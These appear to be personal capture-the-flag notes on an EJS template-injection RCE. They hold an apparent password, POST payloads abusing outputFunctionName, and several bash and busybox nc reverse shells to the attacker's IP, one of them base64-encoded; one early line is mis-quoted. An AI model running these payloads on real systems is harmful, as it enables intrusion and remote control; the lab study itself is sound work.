**My IP:** 10.9.2.114
**Server IP:** 10.10.227.65

admin.cyprus found
![[Pasted image 20250129174218.png]]
p~]P@5!6;rs558:qv

![[Pasted image 20250129175441.png]]
password ommision in the change username reveals a ejs file
https://github.com/mde/ejs/issues/720

payload
https://eslam.io/posts/ejs-server-side-template-injection-rce/

bash -c 'bash -i >& /dev/tcp/10.10.227.65/4444 0>&1

`%%1");process.mainModule.require('child_process').execSync('bash -c 'bash -i >& /dev/tcp/10.10.227.65/4444 0>&1');//`

`name=a&passord=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl http://10.9.2.114');//`
![[Pasted image 20250129181426.png]]
![[Pasted image 20250129181432.png]]
hit

bash -i >& /dev/tcp/10.9.2.114/4444 0>&1

/bin/bash -i >& /dev/tcp/10.9.2.114/4444 0>&1

name=a&passord=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c "echo YnVzeWJveCBuYyAxMC45LjIuMTE0IDQ0NDQgLWUgc2g= | base64 -d | bash"');//

https://www.revshells.com/
needed to base 64 encode to get reverse shell working

![[Pasted image 20250129182335.png]]
